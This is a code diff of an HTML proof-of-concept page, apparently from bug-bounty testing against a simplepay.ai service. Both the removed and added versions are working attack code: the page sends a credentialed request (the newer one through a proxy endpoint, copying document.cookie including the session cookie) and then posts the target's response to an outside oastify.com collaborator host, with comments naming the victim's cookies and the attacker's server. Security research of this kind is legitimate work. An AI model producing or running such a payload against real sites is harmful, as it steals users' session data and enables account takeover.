@@ -1,19 +1,44 @@
-<html> 
-<body> 
-   <script> 
-      var xhr = new XMLHttpRequest(); 
-      xhr.open('GET', 'https://api.simplepay.ai/app', true); 
-      xhr.withCredentials = true;  // Ensures cookies are sent 
-      xhr.onreadystatechange = function() { 
-         if (xhr.readyState == 4 && xhr.status == 200) { 
-            // Send the data back to the attacker's server 
-            fetch('https://031slf2yh2zp6civh5siwfrwlnref63v.oastify.com', { 
-               method: 'POST', 
-               body: xhr.responseText 
-            }); 
-         } 
-      }; 
-      xhr.send(); 
-   </script> 
-</body> 
+<!DOCTYPE html>
+<html>
+<body>
+   <script>
+      // Construct the POST request to the target proxy
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://dev.simplepay.ai/~scalar/proxy', true); 
+      xhr.setRequestHeader('Content-Type', 'application/json');  // The content type must match the expected by the target API
+      xhr.withCredentials = true;  // Ensures the victim's cookies are sent with the request
+
+      // When the request completes, we send the response to the attacker's server
+      xhr.onreadystatechange = function() {
+         if (xhr.readyState == 4 && xhr.status == 200) {
+            // Send the target server's response to the attacker's server
+            fetch('https://lrgnxx0coh6ep0b4qq6vhmlq2h88wykn.oastify.com', {
+               method: 'POST',
+               headers: {
+                  'Content-Type': 'application/json'
+               },
+               body: JSON.stringify({
+                  response: xhr.responseText  // Send the response from the target server
+               })
+            });
+         }
+      };
+
+      // Construct the body of the malicious POST request
+      var body = {
+         method: "GET",
+         url: "https://api.simplepay.ai/app",
+         auth: {
+            type: "none"
+         },
+         headers: {
+            "Content-Type": "application/json",  
+            "Cookie": document.cookie  // Include the victim's cookies, including the sid cookie
+         }
+      };
+
+      // Send the malicious request to the proxy server
+      xhr.send(JSON.stringify(body));
+   </script>
+</body>
 </html>
